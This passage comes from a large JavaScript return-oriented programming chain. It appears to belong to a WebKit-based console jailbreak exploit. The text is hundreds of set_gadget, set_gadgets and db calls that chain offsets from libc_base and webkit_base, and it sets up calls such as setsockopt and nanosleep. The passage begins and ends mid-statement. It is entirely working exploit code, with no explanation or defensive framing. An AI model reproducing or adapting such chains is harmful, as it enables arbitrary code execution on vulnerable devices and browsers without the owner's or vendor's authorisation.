libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+213648, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+213664, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+213736, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+213752, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+213904, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+213936, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+213888, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+213920, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+214008, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+214024, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+214136, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+214120, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
libc_base+793877, 
ropchain+214264, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+214280, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+214248, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+214384, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+214448, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+214416, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+214560, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+214552, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+214576, 
ropchain+216288, 
libc_base+793877, 
ropchain+214632, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+214720, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+214736, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+214872, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+214888, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+214856, 
webkit_base+7438103, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+214976, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+214992, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+215144, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+215176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+215128, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+215160, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+215272, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+215256, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+215376, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+181656, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+215512, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+215528, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+215496, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+215624, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+215608, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+215704, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([65, 0]); 
set_gadget(libc_base+788575,); 
db([65, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+215856, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+215872, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+215840, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
libc_base+389047, 
libc_base+269973, 
libc_base+793877, 
ropchain+216040, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+216056, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+216024, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+216192, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+216208, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+216176, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+389047, 
libc_base+269973, 
libc_base+793877, 
ropchain+216280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+882884, 
libc_base+793877, 
ropchain+216400, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+216416, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+216384, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+216520, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+216568, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+216552, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+216680, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+216672, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+216696, 
ropchain+218776, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([25, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+216944, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+217032, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+217048, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+217184, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+217200, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+217168, 
webkit_base+7438103, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+217288, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+217304, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+217456, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+217488, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+217440, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+217472, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+217584, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+217568, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+217688, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+220296, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+217824, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+217840, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+217808, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+217944, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+217992, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+217976, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+218104, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+218096, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+218120, 
ropchain+218568, 
libc_base+50775, 
libc_base+793877, 
ropchain+218192, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+218344, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+218376, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+218328, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+218360, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+218448, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+218464, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+218560, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+218544, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+397872, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+218728, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+221624, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+218792, 
libc_base+811575, 
ropchain+218808, 
libc_base+811575, 
ropchain+213504, 
libc_base+50775, 
libc_base+793877, 
ropchain+218848, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+218976, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+218960, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+219072, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+219160, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+219176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+219280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+219264, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+219336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+219424, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+219552, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+219536, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+219648, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+219736, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+219752, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+219856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+219840, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+219928, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877 
]);
db([12, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+220064, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+220048, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+220160, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+220176, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+220288, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+220272, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
setsockopt_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+221616, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
nanosleep_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+222944, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+223016, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+223080, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([1032, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+223152, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+223280, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+223264, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+223376, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+223464, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+223480, 
